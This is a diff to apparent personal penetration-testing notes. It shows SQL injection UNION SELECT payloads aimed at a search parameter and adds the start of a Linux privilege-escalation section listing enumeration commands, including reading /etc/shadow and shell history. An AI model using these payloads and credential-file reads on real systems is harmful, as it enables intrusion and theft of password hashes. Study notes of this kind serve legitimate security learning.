@@ -36,3 +36,26 @@ or
 `Sql.php?search=pentesting' and 1 = 0 union all select 1,database(),@@version,1,1,1 from information_schema.tables where 1=0 OR 1=1-- -`  
 
 `Sql.php?search=pentesting' union select 1,table_name,1,1,1,1 from information_schema.tables#` [In the search field: `pentesting' UNION SELECT 1,table_name,1,1 FROM information_schema.tables-- -`]
+
+## Privilege escalation (Linux)
+https://www.youtube.com/watch?v=ZTnwg3qCdVM
+### System Enumeration
+First get OS version, such that you can look for exploits of it and to be able to keep track of it  
+`uname -a`  
+Get info of the architecture, so you know vendor type, amount of cores and threads, etc. (good to know for some exploits)  
+`lscpu`  
+Check what services are running.  
+`ps aux`  
+
+### User Enumeration
+To find out who we are, what permissions we have and what we are capable of doing.  
+To check our username, what id´s everybody on the system has, and what sudo commands we can run, we use the following commands  
+`whoami` `id` `sudo -l`  
+We can check for other users  
+`cat /etc/passwd | cut -d : -f 1`
+We should look if we have access to any sensitive files, such as the shadow file
+`cat /etc/shadow`  
+Look at history is available, as in commands done by user  
+`history`  
+
+### Network Enumeration
